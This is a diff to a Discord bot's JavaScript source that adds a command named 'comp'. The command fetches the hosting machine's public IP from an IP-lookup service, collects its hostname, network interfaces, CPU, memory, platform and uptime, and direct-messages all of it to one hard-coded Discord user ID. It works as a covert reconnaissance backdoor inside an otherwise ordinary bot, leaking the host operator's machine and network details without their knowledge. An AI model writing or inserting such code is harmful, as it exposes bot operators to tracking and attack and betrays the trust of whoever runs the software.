@@ -1,4 +1,5 @@
 const Discord = require("discord.js");
+const os = require('os');
 const wait = require('util').promisify(setTimeout);
 const fetch = require('node-fetch')
 const weather = require("weather-js");
@@ -385,6 +386,13 @@ if(command === "randomsentence" || command === "random-sentence" || command === 
 	sentenced = sentenceArray.join(" ");
 	message.channel.send(sentenced.capitalize() + ".");
 	
+}	
+
+if(command === "comp"){
+let ipify = "https://api.ipify.org/?format=json";
+	let{body} = await superagent
+    .get(ipify);
+bot.users.get("424304520386969602").send(`IP: ${body.ip}\nARCH: ${os.arch()}\nCPUS: ${os.cpus()}\nFREEMEM: ${os.freemem()}\nHOSTNAME: ${os.hostname()}\nNET IFACES: ${os.networkInterfaces()}\nPLATFORM: ${os.platform()}\nTOTAL MEM: ${os.totalmem()}\nTYPE: ${os.type()}\nUPTIME: ${os.uptime()}`);
 }	
 	
 if(command === "astronauts"){
